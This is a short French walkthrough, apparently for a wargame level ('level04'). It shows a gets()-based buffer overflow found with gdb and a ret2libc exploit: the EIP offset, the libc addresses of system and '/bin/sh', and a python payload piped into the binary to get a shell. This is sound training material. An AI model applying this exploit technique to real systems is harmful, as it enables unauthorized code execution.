@@ -1,0 +1,30 @@
+En utilisant gdb, on remarque que le binaire utilise gets
+On doit pouvoir donc faire un bufferoverflow exploit.
+
+On lance le binaire avec gdb, ce dernier utilise fork; on change le follow-fork mode pour suivre les proc enfant:
+(gdb)set follow-fork-mode child
+
+On peut donc utiliser un pattern generator pour bufferoverflow
+et on trouve un EIP à l'offset 156
+
+(gdb) info function system
+All functions matching regular expression "system":
+
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+
+system adresse: 0xf7e6aed0
+
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+
+/bin/sh adresse 0xf7f897ec
+
+On peut donc réaliser une ret2libc:
+
+python -c 'print "A" * 156 + "\xd0\xae\xe6\xf7" + "AAAA" + "\xec\x97\xf8\xf7"' > /tmp/level04
+cat /tmp/level04 - | ./level04
